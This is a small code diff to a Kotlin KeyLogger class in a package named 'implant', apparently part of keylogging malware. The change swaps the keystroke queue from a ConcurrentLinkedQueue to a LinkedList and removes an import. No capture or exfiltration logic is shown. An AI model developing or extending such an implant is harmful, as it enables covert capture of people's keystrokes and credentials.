@@ -10,12 +10,11 @@
 package com.cooperthecoder.implant
 
 import java.util.*
-import java.util.concurrent.ConcurrentLinkedQueue
 import java.util.concurrent.atomic.AtomicLong
 
 class KeyLogger {
 
-    val keystrokeQueue: Queue<String> = ConcurrentLinkedQueue<String>()
+    val keystrokeQueue: Queue<String> = LinkedList<String>()
     val lastEvent = AtomicLong(0)
 
     fun recordKeystroke(keystroke: String, time: Long) {
